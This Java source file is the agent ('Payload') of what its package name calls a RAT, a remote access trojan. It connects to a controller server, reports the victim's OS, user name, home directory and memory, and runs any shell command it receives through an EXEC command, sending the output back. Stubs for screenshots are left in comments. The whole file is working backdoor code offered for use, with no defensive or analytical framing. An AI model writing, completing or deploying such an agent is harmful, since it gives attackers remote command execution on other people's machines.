package com.stoppedwumm.rat.AgentClient;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.management.ManagementFactory;
import java.lang.management.OperatingSystemMXBean;
import java.net.Socket;
import java.net.UnknownHostException; // For more detailed info if needed

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.node.BooleanNode;

public class App {
    
    private static String SERVER_HOSTNAME = "localhost";
    private static int SERVER_PORT = 3000;
    private static String myClientId = null;
    private static PrintWriter out;
    private static BufferedReader in;
    private static volatile boolean running = true;
    private static JsonNode cfg = null;

    public static void main(String[] args) throws Exception {
        cfg = RessourceManager.readConfig();
        System.out.println("Agent Client (Payload) starting...");
        if (args.length == 2 && args[0] != null && args[1] != null && cfg.get("prebuilt") != BooleanNode.getTrue()) {
            SERVER_HOSTNAME = args[0];
            SERVER_PORT = Integer.parseInt(args[1]);
        } else {
            System.out.println("Agent Client (Payload) running in localhost mode");
            SERVER_HOSTNAME = "localhost";
            SERVER_PORT = 3000;
        }

        try (Socket socket = new Socket(SERVER_HOSTNAME, SERVER_PORT)) {
            out = new PrintWriter(socket.getOutputStream(), true);
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            System.out.println("Connected to middleware server at " + SERVER_HOSTNAME + ":" + SERVER_PORT);

            String serverMessage = in.readLine();
            if (serverMessage != null && serverMessage.startsWith("ID:")) {
                myClientId = serverMessage.substring(3);
                System.out.println("Assigned Agent ID by server: " + myClientId);
            } else {
                System.err.println("Error: Did not receive a valid ID from the server. Received: "
                        + (serverMessage == null ? "<null>" : serverMessage));
                return;
            }

            System.out.println("Agent [" + myClientId + "] listening for commands...");
            String receivedMessage;
            while (running && (receivedMessage = in.readLine()) != null) {
                System.out.println("Agent Received: " + receivedMessage);

                if (receivedMessage.startsWith("FROM ")) {
                    // Format: FROM <originatorControllerId>: <actual_command>
                    String[] parts = receivedMessage.split(":", 2);
                    if (parts.length == 2) {
                        String header = parts[0];
                        String actualCommandWithArgs = parts[1].trim();
                        String originatorControllerId = header.substring("FROM ".length()).trim();

                        System.out.println("Agent [" + myClientId + "] processing command '" + actualCommandWithArgs
                                + "' from Controller [" + originatorControllerId + "]");

                        // --- Process the command ---
                        String result;
                        String commandKey = actualCommandWithArgs.split("\\s+")[0].toUpperCase(); // Get the first word
                                                                                                  // as command

                        switch (commandKey) {
                            case "GET_SYS_INFO":
                                result = getSystemInfo();
                                break;
                            // Add more cases for other commands here
                            // case "TAKE_SCREENSHOT":
                            // result = takeScreenshot();
                            // break;
                            // case "EXEC":
                            // String cmdToExec = actualCommandWithArgs.substring("EXEC".length()).trim();
                            // result = executeSystemCommand(cmdToExec);
                            // break;
                            case "EXEC":
                                System.out.println("Executing command: " + actualCommandWithArgs);
                                String commandParts = actualCommandWithArgs.replaceFirst("EXEC ", "");
                                String cmdToExec = commandParts;
                                result = executeSystemCommand(cmdToExec);
                                break;
                            default:
                                result = "AGENT_CMD_UNKNOWN: Command '" + commandKey + "' not recognized by agent "
                                        + myClientId;
                                break;
                        }

                        // Send result back to the originator via the server
                        String responseToRelay = "RELAY " + originatorControllerId + " " + result;
                        out.println(responseToRelay);
                        System.out.println(
                                "Agent [" + myClientId + "] sent response to Controller [" + originatorControllerId
                                        + "]: " + result.substring(0, Math.min(result.length(), 100)) + "..."); // Log
                                                                                                                // snippet
                    }
                } else if (receivedMessage.startsWith("SERVER_ALERT:") || receivedMessage.startsWith("SERVER_MSG:")) {
                    // Just print server messages
                } else if (receivedMessage.equals("SERVER: Disconnecting you now.")) {
                    System.out.println("Server is disconnecting this agent.");
                    running = false;
                    break;
                }
            }

        } catch (UnknownHostException e) {
            System.err.println("Don't know about host " + SERVER_HOSTNAME);
        } catch (IOException e) {
            if (running) {
                System.err.println("Agent I/O error or connection lost: " + e.getMessage());
            }
        } finally {
            running = false;
            System.out.println("Agent Client [" + (myClientId != null ? myClientId : "UNKNOWN") + "] shutting down.");
            try {
                if (in != null)
                    in.close();
            } catch (IOException e) {
                /* ignore */ }
            if (out != null) {
                out.close();
                if (out.checkError()) {
                    System.err.println("Error flag set on agent PrintWriter during its operations or close.");
                }
            }
        }
    }

    /**
     * Gathers various system properties.
     * 
     * @return A string containing system information, formatted with newlines.
     */
    private static String getSystemInfo() {
        StringBuilder sb = new StringBuilder();
        sb.append("AGENT_SYS_INFO_START\n"); // Marker for easier parsing by controller if needed
        sb.append("OS Name: ").append(System.getProperty("os.name")).append("\n");
        sb.append("OS Version: ").append(System.getProperty("os.version")).append("\n");
        sb.append("OS Architecture: ").append(System.getProperty("os.arch")).append("\n");
        sb.append("User Name: ").append(System.getProperty("user.name")).append("\n");
        sb.append("User Home: ").append(System.getProperty("user.home")).append("\n");
        sb.append("Java Version: ").append(System.getProperty("java.version")).append("\n");
        sb.append("Java Vendor: ").append(System.getProperty("java.vendor")).append("\n");
        sb.append("Current Directory: ").append(System.getProperty("user.dir")).append("\n");

        // More detailed OS info using OperatingSystemMXBean
        OperatingSystemMXBean osBean = ManagementFactory.getOperatingSystemMXBean();
        sb.append("Available Processors: ").append(osBean.getAvailableProcessors()).append("\n");
        // Note: osBean.getSystemLoadAverage() might return -1 if not available or not
        // supported.
        double loadAverage = osBean.getSystemLoadAverage();
        sb.append("System Load Average (last min): ")
                .append(loadAverage == -1.0 ? "N/A" : String.format("%.2f", loadAverage)).append("\n");

        // For even more specific info (like total/free memory), you'd use methods from
        // com.sun.management.OperatingSystemMXBean
        // This requires casting and might not be portable across all JVMs, but common
        // on Oracle/OpenJDK.
        if (osBean instanceof com.sun.management.OperatingSystemMXBean) {
            com.sun.management.OperatingSystemMXBean sunOsBean = (com.sun.management.OperatingSystemMXBean) osBean;
            long totalPhysicalMemory = sunOsBean.getTotalPhysicalMemorySize();
            long freePhysicalMemory = sunOsBean.getFreePhysicalMemorySize();
            long committedVirtualMemory = sunOsBean.getCommittedVirtualMemorySize();

            sb.append("Total Physical Memory: ").append(formatSize(totalPhysicalMemory)).append("\n");
            sb.append("Free Physical Memory: ").append(formatSize(freePhysicalMemory)).append("\n");
            sb.append("Committed Virtual Memory: ").append(formatSize(committedVirtualMemory)).append("\n");
        }
        sb.append("AGENT_SYS_INFO_END"); // Marker
        return sb.toString();
    }

    /**
     * Helper method to format byte sizes into KB, MB, GB.
     */
    private static String formatSize(long size) {
        if (size <= 0)
            return "0 B";
        final String[] units = new String[] { "B", "KB", "MB", "GB", "TB" };
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        return String.format("%.1f %s", size / Math.pow(1024, digitGroups), units[digitGroups]);
    }

    private static String executeSystemCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            StringBuilder output = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("#nl#");
                }
                while ((line = errorReader.readLine()) != null) {
                    output.append("ERROR: ").append(line).append("#nl#");
                }
            }
            try {
                process.waitFor();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt(); // Restore the interrupted status
                return "Error: Command execution was interrupted.";
            }
            return output.toString();
        } catch (IOException e) {
            return "Error executing command: " + e.getMessage();
        }
    }

    // Placeholder for executeSystemCommand (implement with caution)
    // private static String executeSystemCommand(String command) {
    // // Implement command execution logic here
    // // Be extremely careful with security implications
    // return "Command execution result for: " + command;
    // }
}